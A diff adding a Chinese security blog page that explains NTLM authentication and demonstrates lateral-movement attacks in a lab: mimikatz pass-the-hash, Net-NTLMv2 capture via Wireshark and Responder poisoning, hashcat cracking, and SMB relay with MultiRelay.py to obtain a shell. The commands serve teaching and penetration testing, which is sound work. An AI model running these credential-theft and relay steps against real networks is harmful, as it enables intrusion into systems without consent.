@@ -1,0 +1,404 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>NTLM网络身份认证-SMB Relay和PTH | Tptfb11&#39;S Blog</title>
+  <meta name="author" content="Tptfb11">
+  
+  <meta name="description" content="内网渗透横向移动.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="NTLM网络身份认证-SMB Relay和PTH"/>
+  <meta property="og:site_name" content="Tptfb11&#39;S Blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="Tptfb11&#39;S Blog" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">Tptfb11&#39;S Blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="归档文章.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="文章分类.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="文章标签.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tools" title="常用工具.">
+			  <i class="fa fa-fighter-jet"></i>Tools
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/notes" title="生活随笔.">
+			  <i class="fa fa-paper-plane"></i>Notes
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="关于我.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> NTLM网络身份认证-SMB Relay和PTH</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  
+		 <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> 内网渗透横向移动.
+		 </div> <!-- alert -->
+	  		
+
+	  <h2 id="写在前边"><a href="#写在前边" class="headerlink" title="写在前边"></a>写在前边</h2><p>Windows 横向渗透的两种方式。</p>
+<p> 1、<strong>hash传递攻击</strong>，通过传递NTLM-Hash，登录机器，简称PTH；  </p>
+<p> 2、<strong>ticket传递攻击</strong>，通过传递kerberos的ticket，登录机器，简称PTT；  </p>
+<p>这一篇聊一下NTLM协议和PTH攻击</p>
+<p>Windwos平台下目前主要的网络身份认证协议有：NTLM身份认证、kerberos身份认证。NTLM 的网络认证，既可用于域内的认证服务，又可用于工作组环境。NTLM 有 NTLMv1 、NTLMv2 、NTLMsession v2 三个版本，目前使用最多的是NTLMv2版本。</p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​     NTLM网络认证是基于挑战（challenge）&#x2F;响应（Response）认证机制的一种认证模式。由三种消息组成：通常称为type 1(协商)，类型type 2(质询)和type 3(身份验证)。</p>
+<p>协商：主要用于确认双方协议版本(NTLM v1&#x2F;NTLM V2)。</p>
+<p>质询：就是挑战（Challenge）&#x2F;响应（Response）认证机制起作用的范畴。</p>
+<p>验证：验证主要是在质询完成后，验证结果，是认证的最后一步。</p>
+<h3 id="认证过程"><a href="#认证过程" class="headerlink" title="认证过程"></a>认证过程</h3><p>协商时会确定身份认证协议的版本，这里版本分为v1和v2，NTLMv1与NTLM v2最显著的区别就是Challenge与加密算法不同，共同点就是加密的原料都是NTLM Hash，NTLM v1的Challenge有8位，NTLM v2的Challenge为16位；NTLM v1的主要加密算法是DES，NTLM v2的主要加密算法是HMAC-MD5。 </p>
+<p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172256902.png" alt="image-20221114001321581"></p>
+<p>1、首先， 客户端向服务器发送Type1(协商消息)，主要包含客户端请求和服务器支持的功能列表，即协商具体使用哪种认证协议。</p>
+<p>2、服务器在收到Type1(协商消息)后将会与客户端确认具体的认证协议，随后用用Type2 (质询)进行响应，具体做法是server在本地随机生成16字节的字符串，该字符串即为challenge，同时将challenge缓存并发往客户端。</p>
+<p>3、当客户端收到服务器发来的challenge字符串后，会使用所需验证身份的用户的ntlm hash值对challenge进行加密运算得到response并将response，username，challenge封装（Net-NTLM Hash），后一起发送给服务器。</p>
+<p><strong>response非常关键，它可以向服务器证明客户端掌握了正确的账号和密码。</strong></p>
+<p>4、服务器在接收到客户端发来的response后，会用对用用户的ntlm hash值对缓存在本地的challenge进行加密，把得到的结果与接收到的response进行对比，如果相同则验证通过。</p>
+<p><strong>需要注意的是，域环境下会有所不同：</strong></p>
+<p>在域环境下，由于所有域用户的账号密码都存储在域控制器上，因此NTLM协议会稍有不同。    具体来说，域环境下NTLM身份认证前3步与工作组下的一样。第四步服务器在接收到客户端发来的response时，由于自身并没有存储域用户的ntlm hash，因此会将response，username，challenge封装后转发给域控。域控会代替服务进行身份验证，具体做法也是利用自身存储的域用户的ntlm hash对challenge进行加密，将加密结果与response进行比对，如相同则验证通过。</p>
+<h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>1、协商</p>
+<p>主要包含客户端请求和服务器支持的功能列表，即协商具体使用哪种认证协议。<img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172256837.png" alt="image-20221114002204851">2、服务器在收到Type1(协商消息)后将会与客户端确认具体的认证协议，随后用用Type2 (质询)进行响应，具体做法是server在本地随机生成16位的字符串，该字符串即为challenge，同时将challenge缓存并发往客户端。</p>
+<p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172256407.png" alt="image-20221114002232231"></p>
+<p>3、当客户端收到服务器发来的challenge字符串后，会使用所需验证身份的用户的ntlm hash值对challenge进行加密运算得到response（Net-NTLM Hash），并将response，username，challenge封装后一起发送给服务器</p>
+<p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172256180.png" alt="image-20221114002246206"></p>
+<p>4、服务器在接收到客户端发来的response后，会用对用用户的ntlm hash值对缓存在本地的challenge进行加密，把得到的结果与接收到的response进行对比，如果相同则验证通过。</p>
+<h3 id="PTH攻击"><a href="#PTH攻击" class="headerlink" title="PTH攻击"></a>PTH攻击</h3><p>具体操作步骤不在这里讲述。</p>
+<p>利用前提：知道目标主机管理员的NTML Hash，或密码一样。2012R2之前版本，无补丁KB2871997。</p>
+<p><strong>原理</strong>：哈希传递就是伪造一个客户端，和正常的NTML认证一样。只是我们用户名对应的NTLM Hash传递到其它主机，给出的 Chanllenge加密，生成一个Response，来完成认证。</p>
+<p><strong>KB2871997补丁绕过：</strong> 但是SID为500的Admintrator用户，依然可以使用哈希传递，或者使用AES-256进行哈希传递 。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 抓取AES-<span class="number">256</span>密钥</span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::ekeys&quot;</span></span><br><span class="line"></span><br><span class="line"># 管理员权限运行mimikatz</span><br><span class="line">mimikatz <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::pth /user:Administrator /domain:zeo.com /aes256:&lt;AES-256密钥&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="NET-NTLM-Hash"><a href="#NET-NTLM-Hash" class="headerlink" title="NET-NTLM Hash"></a>NET-NTLM Hash</h2><p>Net-NTLM Hash 与 NTLM Hash 不一样。NTLM 认证的第三步中，客户端收到服务端所发出的challenge后，用账号对应的 NTLM-Hash 对其进行加密得到response，并与用户名、Challenge 等一起组合得到 Net-NTLM Hash发往服务器端。Net-NTLM Hash 不能像 NTLM Hash 一样被攻击者用来进行哈希传递，但是攻击者可以使用各种方法截获客户端与 Server 认证过程中的 Net-NTLM Hash，然后对其进行明文爆破，或者直接用来进行 NTLM 中继攻击。</p>
+<p>Net-NTLM Hash v1的格式为：username::hostname:LM response:NTLM response:challenge</p>
+<p>Net-NTLM Hash v2的格式为：username::domain:challenge:HMAC-MD5:blob</p>
+<p>因此我们可以同过上边的NTLM认证过程的数据包进行拼接处Net-NTLM Hash</p>
+<h3 id="wireshark-数据包截取net-ntlm-hash"><a href="#wireshark-数据包截取net-ntlm-hash" class="headerlink" title="wireshark 数据包截取net-ntlm hash"></a>wireshark 数据包截取net-ntlm hash</h3><p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172256493.png" alt="image-20221114002258755"></p>
+<p>username -&gt;root</p>
+<p>domain -&gt; DESKTOP-G23A1LC</p>
+<p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172257329.png" alt="image-20221114002306573"></p>
+<p>challenge -&gt; 6e62a604e8aa692a</p>
+<p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172257897.png" alt="image-20221114002318797"></p>
+<p>HMAC-MD5 -&gt;3b245388608f0071bb7c65c8f9a1509f</p>
+<p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172257864.png" alt="image-20221114002328944"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">blob -&gt; 3b245388608f0071bb7c65c8f9a1509f01010000000000000bf652807defd8016f77a62ff35bc6520000000002001e00570049004e002d005500420054005300350054003700430033004e00440001001e00570049004e002d005500420054005300350054003700430033004e00440004001e00570049004e002d005500420054005300350054003700430033004e00440003001e00570049004e002d005500420054005300350054003700430033004e004400070008000bf652807defd801060004000200000008003000300000000000000001000000002000006d90ca5add36e3b195080970a456a754d9d921de09ebf2f20d6294a50dabca460a001000000000000000000000000000000000000900280063006900660073002f00570049004e002d005500420054005300350054003700430033004e0044000000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>最后按照格式：username::domain:challenge:HMAC-MD5:blob</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root::DESKTOP-G23A1LC:6e62a604e8aa692a:3b245388608f0071bb7c65c8f9a1509f:3b245388608f0071bb7c65c8f9a1509f01010000000000000bf652807defd8016f77a62ff35bc6520000000002001e00570049004e002d005500420054005300350054003700430033004e00440001001e00570049004e002d005500420054005300350054003700430033004e00440004001e00570049004e002d005500420054005300350054003700430033004e00440003001e00570049004e002d005500420054005300350054003700430033004e004400070008000bf652807defd801060004000200000008003000300000000000000001000000002000006d90ca5add36e3b195080970a456a754d9d921de09ebf2f20d6294a50dabca460a001000000000000000000000000000000000000900280063006900660073002f00570049004e002d005500420054005300350054003700430033004e0044000000000000000000</span><br></pre></td></tr></table></figure>
+
+<h3 id="responder获取net-ntlm-hash"><a href="#responder获取net-ntlm-hash" class="headerlink" title="responder获取net-ntlm hash"></a>responder获取net-ntlm hash</h3><p>上述获取net-ntlm hash 的方法是通过wireshark抓包手动拼接，过程繁琐麻烦。可以通过kali 自带工具responder进行net-ntlm hash 的自动获取：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I eth0  -v</span><br></pre></td></tr></table></figure>
+
+<p>利用 sudo responder -I eth0  -v  设置好监听后，就可以在目标主机上键入错误的UNC路径：</p>
+<p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172257182.png" alt="image-20221114002338729"></p>
+<p>为什么要输入错误的UNC路径？</p>
+<p>在局域网环境下，当用户输入了一个不存在、或者错误的的主机名，或者是在DNS中不存在的主机名时，Windows就会通过利用LLMNR和 NetBIOS名称服务进行查找，最终在局域网内广播LLMNR&#x2F;NBNS数据包来请求解析主机名。而此时我们在局域网内有一台主机权限（攻击机），就可以伪装成受害主机想要访问的机器，从而让受害主机交出相应的登陆凭证。攻击机在此过程中主要是当作一个中间人，去截获客户端的Net-NTLM Hash。</p>
+<p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172257959.png" alt="image-20221114002348140"></p>
+<h3 id="net-ntlm-hash-的爆破"><a href="#net-ntlm-hash-的爆破" class="headerlink" title="net-ntlm hash 的爆破"></a>net-ntlm hash 的爆破</h3><p>当我们获取到net-ntlm hash后，也可以爆破出明文密码。</p>
+<p><strong>hashcat [option]-m：hash-type</strong>，</p>
+<p>-m 5600 对应NetNTLMv2，详细参数可查表：<a target="_blank" rel="noopener" href="https://hashcat.net/wiki/doku.php-o%EF%BC%9A">https://hashcat.net/wiki/doku.php-o：</a></p>
+<p>-o输出文件字典文件为</p>
+<p>–force代表强制执行，测试系统不支持Intel OpenCL</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m <span class="number">5600</span> administrator::DESKTOP-G23A1LC:a14d02a3df2ac807:607be7719d9413676e722eba57e402cd:607be7719d9413676e722eba57e402cd0101000000000000f03f05877defd801e89b718cde0a49ae0000000002001e00570049004e002d005500420054005300350054003700430033004e00440001001e00570049004e002d005500420054005300350054003700430033004e00440004001e00570049004e002d005500420054005300350054003700430033004e00440003001e00570049004e002d005500420054005300350054003700430033004e00440007000800f03f05877defd801060004000200000008003000300000000000000001000000002000006d90ca5add36e3b195080970a456a754d9d921de09ebf2f20d6294a50dabca460a001000000000000000000000000000000000000900280063006900660073002f00570049004e002d005500420054005300350054003700430033004e0044000000000000000000 top100.txt -o res1.txt --force</span><br><span class="line">cat res1.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172257472.png" alt="image-20221114002408729"></p>
+<h3 id="net-ntlm-hash-relay-中继攻击"><a href="#net-ntlm-hash-relay-中继攻击" class="headerlink" title="net-ntlm hash relay (中继攻击)"></a>net-ntlm hash relay (中继攻击)</h3><p>在NTLM Relay中，我们需要截获 Net-NTLM Hash进行重放攻击，从而实现对其他机器的控制控制。对于工作组的机器来说，两台机器的密码需要一致才能成功，对于域用户来说，被欺骗用户（发起请求的用户）需要域管理员组里边的用户才可以，NTLM 中继成功后的权限为被欺骗用户的权限。</p>
+<p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172257790.png" alt="image-20221114002416614"></p>
+<p><strong>前题：</strong></p>
+<p>在进行smb relay攻击之前，需要确定目标主机没有开启smb signing。</p>
+<p>可以通过RunFinger.py来查看下内网中开放的信息，查看smb签名的情况：</p>
+<p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172257468.png" alt="image-20221114002426086"></p>
+<p>这里未开启，开启方式：</p>
+<p><a target="_blank" rel="noopener" href="https://jingyan.baidu.com/article/a378c960c78d05f228283089.html">https://jingyan.baidu.com/article/a378c960c78d05f228283089.html</a></p>
+<p>在开启了SMB Signing的情况下，在SMB协议利用NTLM SSP进行了身份验证后，后续的所有数据包，都会利用NTLM SSP生成的这个session key进行签名。SMB服务端收到后续的数据包后，也会检查数据包的签名，如果签名不对，则拒收。NTLM SSP在生成session key的时候，会需要用到账号密码的原始 LM HASH 或 NT HASH。而relay型的攻击，都是站在一个中间人的位置，我们是不可能知道原始 LM HASH或NT HASH的（如果知道了也就不需要 Relay 这种攻击手法了）。所以，我们是无法计算出来这个session key的，自然也就无法对数据包进行签名。</p>
+<p>利用MultiRelayx.py进行NET-NTLM relay攻击，窃取win10的net-ntlm hash攻击win7。</p>
+<p>win7 IP：192.168.50.128</p>
+<p>kali执行：</p>
+<p>1、 关闭responder对应服务:sudo vim &#x2F;usr&#x2F;share&#x2F;responder&#x2F;Responder.conf  </p>
+<p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172257165.png" alt="image-20221114002434162"></p>
+<p>2、开启responder嗅探。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I eth0 -v</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172257918.png" alt="image-20221114002445517"></p>
+<p>3、 运行脚本攻击win7。python3 MultiRelay.py -t 192.168.50.128 -u ALL  </p>
+<p>4、 win10上输入错误的UNC  </p>
+<p><img src="/images%5CNTLM%E7%BD%91%E7%BB%9C%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81-SMBRelay%E5%92%8CPTH%5Cimage-20221114002453174.png" alt="image-20221114002453174"></p>
+<p>5、 获取到win7的shell  </p>
+<p><img src="https://raw.githubusercontent.com/tpt11fb/blogPic/main/20221113202211172257713.png" alt="image-20221114002459981"></p>
+<h2 id="实战中利用"><a href="#实战中利用" class="headerlink" title="实战中利用"></a>实战中利用</h2><p>利用场景：获取某台主机权限，无法抓取明文，且密码强度很高，无法破解。我们可以尝试使用PTH或者NTLM中继攻击。</p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+	</div>
+
+	
+	<span id="/2022/11/13/NTLM%E7%BD%91%E7%BB%9C%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81-SMBRelay%E5%92%8CPTH/" class="leancloud-visitors view" data-flag-title="NTLM网络身份认证-SMB Relay和PTH">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2022/11/14/CTF-file_get_content函数和suser.ini文件上传白名单/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2022/11/13/hello-world/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"T4cIyHys5R6e08AOwUNWgymj-gzGzoHsz","appKey":"J1TTypyuxpKKmz37Rd7oQ9tE","placeholder":"提交评论时留下邮箱收到回复后将自动通知","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"]}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "提交评论时留下邮箱收到回复后将自动通知",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2022-11-13 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/横向移动/">横向移动<span>3</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/内网渗透/">内网渗透<span>3</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%86%99%E5%9C%A8%E5%89%8D%E8%BE%B9"><span class="toc-article-text">写在前边</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-article-text">简介</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B"><span class="toc-article-text">认证过程</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-article-text">流量分析</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#PTH%E6%94%BB%E5%87%BB"><span class="toc-article-text">PTH攻击</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#NET-NTLM-Hash"><span class="toc-article-text">NET-NTLM Hash</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#wireshark-%E6%95%B0%E6%8D%AE%E5%8C%85%E6%88%AA%E5%8F%96net-ntlm-hash"><span class="toc-article-text">wireshark 数据包截取net-ntlm hash</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#responder%E8%8E%B7%E5%8F%96net-ntlm-hash"><span class="toc-article-text">responder获取net-ntlm hash</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#net-ntlm-hash-%E7%9A%84%E7%88%86%E7%A0%B4"><span class="toc-article-text">net-ntlm hash 的爆破</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#net-ntlm-hash-relay-%E4%B8%AD%E7%BB%A7%E6%94%BB%E5%87%BB"><span class="toc-article-text">net-ntlm hash relay (中继攻击)</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%AE%9E%E6%88%98%E4%B8%AD%E5%88%A9%E7%94%A8"><span class="toc-article-text">实战中利用</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2023 Tptfb11's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
